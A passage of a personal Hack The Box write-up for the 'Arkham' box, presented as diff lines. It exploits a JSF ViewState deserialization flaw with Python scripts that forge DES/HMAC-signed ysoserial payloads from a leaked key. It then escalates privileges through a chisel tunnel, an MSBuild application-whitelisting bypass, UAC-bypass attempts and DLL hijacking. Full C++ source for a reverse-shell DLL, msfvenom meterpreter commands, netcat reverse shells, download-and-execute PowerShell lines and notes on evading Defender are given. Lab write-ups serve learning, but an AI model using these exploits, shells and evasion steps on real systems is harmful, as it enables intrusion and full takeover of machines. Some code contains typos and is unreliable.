+<p>it has a the screen play for batmanforever, some pictures of batmans stuff. Some Server Files all of them are pretty meaningless but the .bak file folds some more details about how the web app works. it says the word secret so i dont know quite yet.</p>
+
+<p>running file on the backup.img reveals that it is a luks encrypted file.</p>
+
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xmlns:web=&quot;http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;                                                      
+xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;                                                     
+id=&quot;WebApp_ID&quot; version=&quot;2.5&quot;&gt;
+&lt;display-name&gt;HelloWorldJSF&lt;/display-name&gt;
+&lt;welcome-file-list&gt;
+&lt;welcome-file&gt;index.html&lt;/welcome-file&gt;
+&lt;welcome-file&gt;index.htm&lt;/welcome-file&gt;
+&lt;welcome-file&gt;default.html&lt;/welcome-file&gt;
+&lt;welcome-file&gt;default.htm&lt;/welcome-file&gt;
+&lt;welcome-file&gt;default.jsp&lt;/welcome-file&gt;
+&lt;/welcome-file-list&gt;
+&lt;servlet&gt;
+&lt;servlet-name&gt;Faces Servlet&lt;/servlet-name&gt;
+&lt;servlet-class&gt;javax.faces.webapp.FacesServlet&lt;/servlet-class&gt;
+&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
+&lt;/servlet&gt;
+&lt;servlet-mapping&gt;
+&lt;servlet-name&gt;Faces Servlet&lt;/servlet-name&gt;
+&lt;url-pattern&gt;*.faces&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;javax.servlet.jsp.jstl.fmt.localizationContext&lt;/param-name&gt;
+&lt;param-value&gt;resources.application&lt;/param-value&gt;
+&lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;description&gt;State saving method: 'client' or 'server' (=default). See JSF Specification 2.5.2&lt;/description&gt;                                                 
+&lt;param-name&gt;javax.faces.STATE_SAVING_METHOD&lt;/param-name&gt;
+&lt;param-value&gt;server&lt;/param-value&gt;
+&lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+&lt;/context-param&gt;
+    &lt;context-param&gt;
+        &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;
+        &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;
+     &lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+&lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;description&gt;
+This parameter tells MyFaces if javascript code should be allowed in
+the rendered HTML output.
+If javascript is allowed, command_link anchors will have javascript code
+that submits the corresponding form.
+If javascript is not allowed, the state saving info and nested parameters
+will be added as url parameters.
+Default is 'true'&lt;/description&gt;
+&lt;param-name&gt;org.apache.myfaces.ALLOW_JAVASCRIPT&lt;/param-name&gt;
+&lt;param-value&gt;true&lt;/param-value&gt;
+&lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;description&gt;
+If true, rendered HTML code will be formatted, so that it is 'human-readable'
+i.e. additional line separators and whitespace will be written, that do not
+influence the HTML code.
+Default is 'true'&lt;/description&gt;
+&lt;param-name&gt;org.apache.myfaces.PRETTY_HTML&lt;/param-name&gt;
+&lt;param-value&gt;true&lt;/param-value&gt;
+&lt;/context-param&gt;
+&lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;org.apache.myfaces.DETECT_JAVASCRIPT&lt;/param-name&gt;
+&lt;param-value&gt;false&lt;/param-value&gt;
+&lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;description&gt;
+If true, a javascript function will be rendered that is able to restore the
+former vertical scroll on every request. Convenient feature if you have pages
+with long lists and you do not want the browser page to always jump to the top
+if you trigger a link or button action that stays on the same page.
+Default is 'false'
+&lt;/description&gt;
+&lt;param-name&gt;org.apache.myfaces.AUTO_SCROLL&lt;/param-name&gt;
+&lt;param-value&gt;true&lt;/param-value&gt;
+&lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;com.sun.faces.numberOfViewsInSession&lt;/param-name&gt;
+&lt;param-value&gt;500&lt;/param-value&gt;
+&lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;com.sun.faces.numberOfLogicalViews&lt;/param-name&gt;
+&lt;param-value&gt;500&lt;/param-value&gt;
+&lt;/context-param&gt;
+&lt;listener&gt;
+&lt;listener-class&gt;org.apache.myfaces.webapp.StartupServletContextListener&lt;/listener-class&gt;                                                                     
+&lt;/listener&gt;
+&lt;/web-app&gt;
+
+</code></pre>
+
+<p>The above code is allot to take in, specifically what caught my eye.</p>
+
+<pre><code>&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+&lt;/context-param&gt;
+    &lt;context-param&gt;
+        &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;
+        &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;
+     &lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/pavram-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+&lt;/context-param&gt;
+
+</code></pre>
+
+<h3 id="decryption">decryption</h3>
+
+<p>Well, getting closer. so the overall objective i think is to make my own payload and take the hmac and append that to my payload verifing that its the correct one nah.</p>
+
+<p>anyways managed to decode the message with pycrypto.</p>
+
+<p>viewstate is encrypted &amp; encoded ontop of that it has a hash it uses to verify it hasn&rsquo;t been changed. the cipher used is single des by default( DEFAULT). Then a hash is taken of the encrypted string. All of that is bundled by encoding everything in base64. So to decrypt everything used python module crypto &amp; some other modules but they are pretty common i suppose. i had some trouble getting everything right so i used allot of prints to get the right, output.</p>
+
+<p><img src="prints.PNG" alt="prints" /></p>
+
+<p><a href="https://pycryptodome.readthedocs.io/en/latest/src/cipher/des.html?highlight=decrypt%20des">https://pycryptodome.readthedocs.io/en/latest/src/cipher/des.html?highlight=decrypt%20des</a></p>
+
+<pre><code>from Crypto.Cipher import DES
+from Crypto.Hash import HMAC, SHA1
+import base64
+import sys
+key = b'JsF9876-' # key for for the des encryptions, and SHA hash
+cryptext = b'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RcVjhMDN4sZB70KtDtngjDm0mNzA9qHjYerxo0jW7zu11SwN/t3lVW5GSeZ1PEA3OZ3jFUE='
+# the cipher used to decrypt &amp; mode
+cipher = DES.net(key, DES.MODE_ECB)
+b64 = base64.b64decode(cryptext)
+#takes the first 72 bytes of the 92 byte decoded string. hmac takes 20 bytes
+# data first 72 bytes the hmac 20bytes so minus the total bityes by 20 to get the data 
+# saved both as variables
+des = cipher.decrypt(b64[:72])
+phac = (b64[-20:])
+print(phac)
+deslen = len(des)
+phaclen = len(phac)
+print (phaclen)
+print 'decrypted des = ' + (des)
+print 'des length = ' + str(deslen)
+</code></pre>
+
+<p>encryptions</p>
+
+<p>encryption need to pad because everything already padded during decryptions seems obivious. then add the padding to cryptext then encrypt that with des and make a hash out of the des encryption.</p>
+
+<pre><code>from Crypto.Cipher import DES
+from Crypto.Hash import HMAC, SHA1
+import base64
+import sys
+key = b'JsF9876-'
+cipher = DES.new(key, DES.MODE_ECB)
+cryptext = b'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RcVjhMDN4sZB70KtDtngjDm0mNzA9qHjYerxo0jW7zu11SwN/t3lVW5GSeZ1PEA3OZ3jFUE='
+
+des = cipher.decrypt(b64[:72])
+phac = (b64[-20:])
+
+
+with open('joker.ysoserial', 'r') as myfile:
+    payload = myfile.read()
+    payload = base64.b64decode(payload)
+pad = 8 - len(payload) % 8
+padding = chr(pad) * pad
+payload += padding
+enpay = cipher.encrypt(payload)
+enpay += phac
+en64pay = base64.b64encode(enpay)
+print 'payload = ' + (en64pay)
+</code></pre>
+
+<p>CRafting PayloAd</p>
+
+<p>This is a tool for crafting payloads for different json enviroments. apache myface uses commons-code-1.3-3.2.1.jar</p>
+
+<p>install python3 pycrypt</p>
+
+<p>sudo apt-get install build-essential python3-dev</p>
+
+<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+
+<p><a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html">https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html</a></p>
+
+<pre><code>java -jar ysoserial/ysoserial.jar CommonsCollections1 &quot;cmd.exe ping -c 3 10.10.14.49&quot; &gt; joker.ysoserial
+</code></pre>
+
+<pre><code>java -cp ysoserial/ysoserial.jar ysoserial.exploit.RMIRegistryExploit 10.10.14.49 80 CommonCollections1 &gt; gold.txt
+</code></pre>
+
+<p>jsf</p>
+
+<p>java server faces</p>
+
+<p>the server if configured to store everything on the server side.</p>
+
+<p><a href="https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a">https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a</a></p>
+
+<p>trying to find some exploit tools and ran jexboss.py it doens&rsquo;t appear to be vulnerable.</p>
+
+<pre><code>./jexboss.py -u http://10.10.10.130:8080/userSubscribe.faces 
+</code></pre>
+
+<p><img src="jexboss.PNG" alt="jexboss" /></p>
+
+<pre><code>#from Crypto.Util.Padding import pad, unpad
+from Crypto.Cipher import DES
+from Crypto.Hash import HMAC, SHA1
+import base64
+import subprocess
+import urllib
+
+serial = b'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'
+
+urlvs = urllib.unquote_plus(serial)
+rawviewstate = base64.b64decode(urlvs)
+viewstate = rawviewstate[:72]
+mac = rawviewstate[-20:]
+
+def decrypt_vs(data):
+    key = 'JsF9876-'
+    mode = DES.MODE_ECB
+    cipher = DES.new(key, mode) 
+    return cipher.decrypt(data)
+def encrypt_vs(data):
+    key = 'JsF9876-'
+    mode = DES.MODE_ECB
+    cipher = DES.new(key, mode)
+    pad = (8 - (len(data) % 8)) % 8
+    padded = data + (chr(pad)*pad).encode()
+    return cipher.encrypt(padded)
+
+
+def hmac_vs(data):
+    key = 'JsF9876-'
+    mode = digestmod=SHA1
+    h = HMAC.new(key, data, mode)
+    return h.digest()
+
+
+print (rawviewstate)
+decrypted = decrypt_vs(viewstate)
+print ('hmac &amp; viewstate encoed')
+print (mac)
+print (base64.b64encode(decrypted))
+print ('original =' + serial)
+#put it back together
+encrypted = (urllib.quote_plus(encrypt_vs(decrypted)))
+encryptvs = (encrypted + (mac).encode(&quot;base64&quot;))
+print (encryptvs)
+meow = (encrypt_vs(decrypted)).encode(&quot;base64&quot;).replace('\n','')
+vsmac = (hmac_vs(viewstate)).encode(&quot;base64&quot;).replace('\n','')
+goldvs = (urllib.quote_plus(meow + vsmac))
+print (goldvs)
+#testing if i can urllencode at the end x
+#this part is basically just adding the padding back because it is removed
+endecrypted = encrypt_vs(decrypted)
+urlmeow  = (encrypt_vs(decrypted)).encode(&quot;base64&quot;).replace('\n','')
+urlvsmac = (hmac_vs(endecrypted)).encode(&quot;base64&quot;).replace('\n','')
+urlgoldvs = (urllib.quote_plus(urlmeow + urlvsmac))
+print (urlgoldvs)
+</code></pre>
+
+<pre><code>#from Crypto.Util.Padding import pad, unpad
+from Crypto.Cipher import DES
+from Crypto.Hash import HMAC, SHA1
+import base64
+import subprocess
+import urllib
+
+command = raw_input('Command: ')
+ysoserial = b'java -jar /home/htb/boxes/arkham/ysoserial/ysoserial.jar CommonsCollections1 \'' + command + '\''
+payload = subprocess.check_output(ysoserial, stderr=subprocess.STDOUT, shell=True)
+
+def decrypt_vs(data):
+    key = 'JsF9876-'
+    mode = DES.MODE_ECB
+    cipher = DES.new(key, mode)
+    return cipher.decrypt(data)
+def encrypt_vs(data):
+    key = 'JsF9876-'
+    mode = DES.MODE_ECB
+    cipher = DES.new(key, mode)
+    pad = (8 - (len(data) % 8)) % 8
+    padded = data + (chr(pad)*pad).encode()
+    return cipher.encrypt(padded)
+def hmac_vs(data):
+    key = 'JsF9876-'
+    mode = digestmod=SHA1
+    h = HMAC.new(key, data, mode)
+    return h.digest()
+
+#pad payload it needs to be in the padded state to be
+#to be hashed/ viewstate to make a proper hash
+purevs = encrypt_vs(payload)
+encrypted = (encrypt_vs(payload)).encode(&quot;base64&quot;).replace('\n','')
+enmac = (hmac_vs(purevs)).encode(&quot;base64&quot;).replace('\n','')
+pleasesubscribe = (urllib.quote_plus(encrypted + enmac))
+print (pleasesubscribe) # why not lol
+</code></pre>
+
+<p>possible avenues to root 5985 winrm but i would need creds still?</p>
+
+<p>smb maybe accessing the smb share locally will give me super powers</p>
+
+<p>i could encode thing and bypass applocker.</p>
+
+<p>the hints on the forum allude to using soemthing i have access to in the begining. or enumed.</p>
+
+<p>well just use chisel and try to access winrm since it isn&rsquo;t exposed tot he internet i feel like it may not have any security locally. @@</p>
+
+<p>Well, winrm is most likely one way&hellip; but the previous creds and possible usersnames didn&rsquo;t work. Enumerating the user directories.</p>
+
+<p>interesting directories</p>
+
+<pre><code>c:\Users\Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch&gt;
+</code></pre>
+
+<p>so internet explorer stores browsin</p>
+
+<pre><code>c:\Users\Default\AppData\Roaming\Microsoft\Windows&gt;
+sendto had some intersting files. i mgiht need to exfil
+</code></pre>
+
+<p>default user</p>
+
+<p>Note: To enumerate user on a windows system use net user</p>
+
+<pre><code>![netuser](netuser.PNG)net user
+</code></pre>
+
+<p><img src="netuser.PNG" alt="netuser" /></p>
+
+<p>So got user as batman using winrm.rb set it to negociate. Used chisel to tunnel a connection to 5985</p>
+
+<p>arkham ran powerup</p>
+
+<p>some ways to enumerate powershell</p>
+
+<p>these are the commandlets used for addministrating localaccounts</p>
+
+<pre><code> Get-Command -Module Microsoft.PowerShell.LocalAccounts 
+</code></pre>
+
+<pre><code>Add-LocalGroupMember — Add a user to the local group
+Disable-LocalUser —Disable a local user account
+Enable-LocalUser — Enable a local user account
+Get-LocalGroup — View local group preferences
+Get-LocalGroupMember — View the list of all local group members
+Get-LocalUser — View a local user account’s preferences
+New-LocalGroup — Create a new local group
+New-LocalUser — Create a new local user account
+Remove-LocalGroup — Remove a local group
+Remove-LocalGroupMember — Remove a member from a local group
+Remove-LocalUser — Remove a local user account
+Rename-LocalGroup — Rename a local group
+Rename-LocalUser — Rename a local user account
+Set-LocalGroup — Change the settings of a local group
+Set-LocalUser — Change the account settings of a local user
+</code></pre>
+
+<p>get-localuser this should print out the users</p>
+
+<pre><code>Get-LocalUser
+</code></pre>
+
+<p>Get-LocalUser this should ouput all the proprties for local user account.</p>
+
+<pre><code>Get-LocalUser -Name * | Select-Object *
+</code></pre>
+
+<pre><code>Add-LocalGroupMember -Group 'Administrators' -Member ('batman') –Verbose
+</code></pre>
+
+<p>well fuck it im done with this bullshit.</p>
+
+<pre><code>[Reflection.Assembly]::Load([IO.File]::ReadAllBytes(&quot;$pwd\CMSTP-UAC-Bypass.dll&quot;))
+</code></pre>
+
+<p><a href="https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html">https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html</a></p>
+
+<pre><code>SchTasks /Create /SC DAILY /TN ``&quot;NoUAC&quot;` `/TR &quot;C:\tomcat\apache-tomcat-8.5.37\bin\death-PINK.ps1&quot; /ST ``23:``36
+</code></pre>
+
+<p>ugh so tried to bypass the uac by using empires invoke-wscriptbypassuac. The target isn&rsquo;t vulnerable, i think this would have shown up on the powerup scan maybe. the later one worked just as well but failed all the same. the former the nc string is encode in base64.</p>
+
+<p><a href="https://github.com/nettitude/PoshC2/blob/master/Modules/Invoke-WScriptBypassUAC.ps1">https://github.com/nettitude/PoshC2/blob/master/Modules/Invoke-WScriptBypassUAC.ps1</a></p>
+
+<pre><code>Invoke-WScriptBypassUAC -payload &quot;powershell.exe -ep Bypass -WindowStyle Hidden -enc LWVuYyAuXG5jLmV4ZSAtZSBjbWQuZXhlIDEwLjEwLjE0LjEyOCA4MDg1&quot;
+
+Invoke-WScriptBypassUAC -payload &quot;.\nc.exe -e cmd.exe 10.10.14.128 8085&quot;
+</code></pre>
+
+<p>finding elevated bianries</p>
+
+<p>list of elevated exe bianries</p>
+
+<pre><code>
+</code></pre>
+
+<pre><code>findstr /C:&quot;&lt;autoElevate&gt;true&quot; C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+</code></pre>
+
+<p>Output</p>
+
+<pre><code>systemPropertiesAdvanced.exe
+        &lt;autoElevate&gt;true&lt;/autoElevate
+</code></pre>
+
+<pre><code>C:\Windows\system32;
+C:\Windows;
+C:\Windows\System32\Wbem;
+C:\Windows\System32\WindowsPowerShell\v1.0\;
+C:\Windows\System32\OpenSSH\;
+C:\Users\Batman\AppData\Local\Microsoft\WindowsApps
+</code></pre>
+
+<p><img src="kefwlkfqwq.PNG" alt="kefwlkfqwq" /></p>
+
+<p>Make a .exe msfvenom shell or nishang</p>
+
+<p>then make a ddl that runs when</p>
+
+<p>using powerup to find missing dll to hijack</p>
+
+<pre><code>IEX(New-Object Net.WebClient).downloadstring(&quot;http://10.10.14.128/PowerUp.ps1&quot;)
+Find-ProcessDLLHijack
+</code></pre>
+
+<pre><code>msfenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.128 lport=19135 -f dll &gt; srrstr.dll
+</code></pre>
+
+<p>ROOT</p>
+
+<p>Using msfvenom to make dll doesn&rsquo;t work. micrsoft has been imporving defender. it now detects those and possibly those amde by visual studio. we will first setup a chisel proxie so we can get around the restrictiosn and gian access to winrm locally. Then we will bypass constrained language mode. then pivot into a nc shell and drop our malious dll into C:\Users\Batman\AppData\Local\Microsoft\WindowsApps then we will run systempropertiesadvanced.exe to elvate our session to system nt authority power. You may notice the user doesn&rsquo;t change thats because windows 8 and above the operating system was redesigned.</p>
+
+<p>phase 1 chisel first well get a shell using the apache myfaces flaw we found. ill setup a python http server to how the files. then setup chisel locally then chisel on the target system.</p>
+
+<pre><code>python3 -m http.server 80
+nc -lvnp 10404
+</code></pre>
+
+<p>Run chisel on localhost</p>
+
+<pre><code>./chisel server -p 9001 --reverse -v
+</code></pre>
+
+<p>then we will drop the payload to disk. using invoke web request.</p>
+
+<pre><code>powershell iex(IWR &quot;http://10.10.15.136/chisel.exe&quot; -OutFile chisel.exe)
+chisel.exe client 10.10.15.136:9001 R:127.0.0.1:10001:localhost:5985
+</code></pre>
+
+<p><img src="step1.PNG" alt="step1" /></p>
+
+<p><img src="step2.PNG" alt="" /></p>
+
+<p>we will use the creds found in the smb share to login as alfred ( batmanforever) . once inside there we will find a outlook email bak file that we will decrypt to get batmans creds. This was pretty tough to find the right tool to open the outlook file. pstwalker it will try and get you to pay for stuff but thats not needed with a little tinkering i was able to get the message.</p>
+
+<p><img src="email-password.PNG" alt="email-password" /></p>
+
+<p>now we need to edit the winrm ruby script with batmans creds.</p>
+
+<p><img src="step3.PNG" alt="step3" /></p>
+
+<p>now we have to byass the clm enviroment and windows defender. I used a msbuild method to bypass clm.  made the dll manually used mingw to compile the dll. since we landed in a writeable directory that we can execute binaries we don&rsquo;t need to move to another directory.</p>
+
+<pre><code>C:\tomcat\apache-tomcat-8.5.37\bin
+</code></pre>
+
+<p>next we will download the application whitelisting using this msbuild bypass. githublink. we will drop it to disk, then run the bypass.</p>
+
+<pre><code>powershell IWR &quot;http://10.10.15.136/pinkie.csproj&quot; -OutFile pinkie.csproj
+c:\windows\microsoft.NET\Framework64\v4.0.30319\MSBUILD.exe pinkie.csproj
+</code></pre>
+
+<p>Creating a DLL without visual studio or msfvenom.</p>
+
+<p>we will be creating three files, dllmain.cpp, revshell.cpp, and rev_shell.h(header)</p>
+
+<p>dllmain.cpp</p>
+
+<pre><code>#include &quot;rev_shell.h&quot;
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+BOOL WINAPI DllMain( HINSTANCE hinstDLL,
+                        DWORD fwdReason,
+                        LPVOID lpReservered)
+{
+        switch (fwdReason)
+        {
+        case DLL_PROCESS_ATTACH:
+                rev_shell();
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+                break;
+        }
+        return TRUE;
+}
+</code></pre>
+
+<p>revshell.cpp</p>
+
+<pre><code>#include &lt;stdio.h&gt;                                                                               
+#include &lt;string.h&gt;
+#include &lt;process.h&gt;
+#include &lt;winsock2.h&gt;
+#include &lt;ws2tcpip.h&gt;
+
+#pragma comment(lib, &quot;Ws2_32.lib&quot;)
+
+#define REMOTE_ADDR &quot;10.10.15.136&quot;
+#define REMOTE_PORT &quot;9135&quot;
+
+void rev_shell()
+{
+        FreeConsole();
+
+        WSADATA wsaData;
+        int iResult = WSAStartup(MAKEWORD(2, 2), &amp;wsaData);
+        struct addrinfo *result = NULL, *ptr = NULL, hints;
+        memset(&amp;hints, 0, sizeof(hints));
+        hints.ai_family = AF_UNSPEC;
+        hints.ai_socktype = SOCK_STREAM;
+        hints.ai_protocol = IPPROTO_TCP;
+        getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &amp;hints, &amp;result);
+        ptr = result;
+        SOCKET ConnectSocket = WSASocket(ptr-&gt;ai_family, ptr-&gt;ai_socktype, ptr-&gt;ai_protocol, NULL, NULL, NULL);                                              
+        connect(ConnectSocket, ptr-&gt;ai_addr, (int)ptr-&gt;ai_addrlen);
+        STARTUPINFO si;
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&amp;si, sizeof(si));
+        si.cb = sizeof(si);
+        ZeroMemory(&amp;pi, sizeof(pi));
+        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        si.hStdInput = (HANDLE)ConnectSocket;
+        si.hStdOutput = (HANDLE)ConnectSocket;
+        si.hStdError = (HANDLE)ConnectSocket;
+        TCHAR cmd[] = TEXT(&quot;C:\\WINDOWS\\SYSTEM32\\CMD.EXE&quot;);
+        CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+	    WSACleanup();
+}
+</code></pre>
+
+<p>rev_shell.h</p>
+
+<pre><code>#pragma Once
+void rev_shell();
+</code></pre>
+
+<p>The last part compiling is tricky i used mingw to compile it was able to evade detection. There is a small catch, the library that windows uses to compile this is named differently in the linux enviroment wine etc. The order in which we list the files when it is compiled matters. this switch has to be at the end of the string  -lws2_32. you may also compile this in x64.</p>
+
+<p><a href="https://blog.didierstevens.com/2018/07/10/quickpost-compiling-dlls-with-mingw-on-kali/">https://blog.didierstevens.com/2018/07/10/quickpost-compiling-dlls-with-mingw-on-kali/</a></p>
+
+<pre><code>i686-w64-mingw32-gcc -shared -o DemoDll-x86.dll dllmain.cpp revshell.cpp rev_shell.h -lws2_32
+</code></pre>
+
+<p>this wont work xD but nice for notes below is x64</p>
+
+<pre><code>x86_64-w64-mingw32-gcc -shared -o DemoDll-x86.dll dllmain.cpp revshell.cpp rev_shell.h -lws2_32
+</code></pre>
+
+<p>now we will download the malcious dll drop it to disc.we have to name the dll srrstr.dll because thats why systempropertiesadvanced.exe calls.</p>
+
+<pre><code>cd C:\Users\Batman\AppData\Local\Microsoft\WindowsApps
+</code></pre>
+
+<pre><code>powershell IWR &quot;http://10.10.15.136/DemoDll-x86.dll&quot; -OutFile srrstr.dll
+</code></pre>
+
+<p>powershell IWR &ldquo;<a href="http://10.10.15.136/DemoDll-x86.dll&quot;">http://10.10.15.136/DemoDll-x86.dll&quot;</a> -OutFile srrstr.dll</p>
+
+<p>now we have to craft a meterpreter shell using msfvenom im going with powershell. but there are other more stealthy options. there are a few missing flags but we don&rsquo;t need those.</p>
+
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.15.136 lport=19135 -f psh -o death.ps1
+</code></pre>
+
+<p>now we run the payload in memory and get our meterpreter shell then migrate into a new process.</p>
+
+<p><img src="step5.PNG" alt="step5" /></p>
+
+<p>A dll is a file a .exe can <img src="step6.PNG" alt="step6" />call if can do a bunch of things it&rsquo;s basically a psedueo module like in python. you can also use it i bleive to allow a program to talk to different laughages .netframeworks.</p>
+
+<pre><code>apt-get install mingw
+</code></pre>
+
+<p>beyond root for later system authority. dl</p>
+
+
+    
+    
+        <div class="chevrons">
+    <div id="navigation">
+<a class="nav nav-prev" href="/hackthebox/boxes/arkham/" title="ARKHAM-writeup"> <i class="fa fa-chevron-left"></i><label>ARKHAM-writeup</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/blue/" title="Blue" style="margin-right: 0px;"><label>Blue</label><i class="fa fa-chevron-right"></i></a></div>
+  </div>
+
+  </section>
+</article>
+
+<footer>
+
+<div class="footline">
+    
+
+    
+
+    
+
+    
+    <div class="github-link">
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/arkham/arkham.md" target="blank"><i class="fa fa-code-fork"></i>
+        Improve this page</a>
+    </div>
+    
+  </div>
+
+
+	<div>
+
+
+  
+    Create a content/_footer.md file to customize the footer content
+  
+
+
+
+	</div>
+</footer>
+
+<script src="/js/clipboard.min.js"></script>
+
+<link href="/css/featherlight.min.css" rel="stylesheet">
+<script src="/js/featherlight.min.js"></script>
+
+
+
+<script src="/theme-flex/script.js"></script>
+
+
+    
+
+    
+    
+
+    
+  </body>
+</html>
